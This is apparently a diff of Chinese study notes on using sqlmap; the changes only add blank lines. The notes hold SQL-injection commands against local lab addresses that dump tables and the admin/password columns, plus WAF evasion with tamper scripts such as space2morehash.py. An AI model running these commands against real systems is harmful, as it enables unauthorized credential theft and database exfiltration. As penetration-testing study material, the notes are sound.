@@ -19,6 +19,7 @@
         -D xxx -T xxxx --columns
 		
 	Note:
+        
            1) 指定列的范围从2－4 : python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --dump -T users -D test --start 2 --stop 4 -v 0
 			
 5. 得到列名有admin，password，需要值：
@@ -26,12 +27,15 @@
         -D xxx -T xxxx -C "admin,password" --dump
 		
 	Note:
+        
 	1) --dump-all 导出所有表，所有数据
 				
 6. 还需要绕waf
 
         python sqlmap.py -u "http://192.168.159.1/news.php?id=1" -v 3 --dbs --batch --tamper "space2morehash.py"
+        
         相同的脚本还有：
+        
             § space2morehash.py
             § space2hash.py
             § base64encode.py
@@ -54,6 +58,7 @@
         -a
 		
 	Note:
+        
         1) -a下面的那些命令是用来看用户，看主机，看权限的
         
 
